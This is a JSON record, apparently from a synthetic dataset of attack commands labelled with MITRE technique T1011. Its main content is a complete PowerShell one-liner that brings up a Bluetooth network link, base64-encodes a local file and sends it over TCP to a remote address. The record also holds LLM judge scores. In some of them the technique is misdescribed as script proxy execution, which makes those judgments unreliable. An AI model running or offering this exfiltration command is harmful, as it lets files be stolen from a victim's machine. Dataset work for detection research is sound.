{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.29.61.2 255.255.255.252 | Out-Null; $b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Users\\Public\\Desktop\\notes.txt')); $client=New-Object Net.Sockets.TcpClient; $client.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.29.61.2'),0)); $client.Connect('172.29.61.1',54721); $strm=$client.GetStream(); $pref=[Text.Encoding]::UTF8.GetBytes('DATA:'); $dat=[Text.Encoding]::UTF8.GetBytes($b64); $suf=[Text.Encoding]::UTF8.GetBytes(':END'); $strm.Write($pref,0,$pref.Length); $strm.Write($dat,0,$dat.Length); $strm.Write($suf,0,$suf.Length); $strm.Close(); $client.Close()",
  "explanation": "Encodes content and sends it over a custom TCP service bound to the Bluetooth interface, ensuring exfiltration flows over the Bluetooth medium (T1011).",
  "rationale_steps": [
    "Initiate the Bluetooth NAP connection.",
    "Configure the Bluetooth NIC with a static address via netsh.",
    "Bind the TCP socket to the Bluetooth IP to constrain medium.",
    "Transmit base64 payload wrapped in innocuous markers over a high port."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-7cae3b7b",
  "source_prompt_hash": "f4a0ca3c",
  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell pipeline is well-formed with balanced quotes/parentheses, valid separators, and parseable .NET and cmd invocations.",
        "semantic_score": 2,
        "semantic_justification": "While it plausibly exfiltrates data over a Bluetooth-bound TCP connection, it does not use a signed system script proxy as described and likely requires admin rights for netsh, making it misaligned with the stated technique and assumptions.",
        "combined_score": 3.5,
        "confidence": 0.6,
        "timestamp": "2025-10-01T22:47:11.301092Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax for variable assignments, pipeline operations, and method calls.",
        "semantic_score": 4,
        "semantic_justification": "The command aligns with exfiltration over alternative protocol (T1011) by establishing a Bluetooth connection, configuring a network interface, encoding file content to base64, and transmitting it over TCP through the Bluetooth channel, though it doesn't use system scripts as proxies mentioned in the technique description.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T04:14:55.738821Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed PowerShell, using correct syntax for external executable calls, cmdlet usage, .NET method invocation, variable assignment, and string/path handling.",
        "semantic_score": 1,
        "semantic_justification": "The command does not demonstrate MITRE ATT&CK T1011 (System Script Proxy Execution) as it directly executes a custom binary and PowerShell commands rather than abusing trusted system scripts as an execution proxy.",
        "combined_score": 3.0,
        "confidence": 1,
        "timestamp": "2025-10-02T04:15:09.826907Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 2.333,
    "llm_average_score": 3.667,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}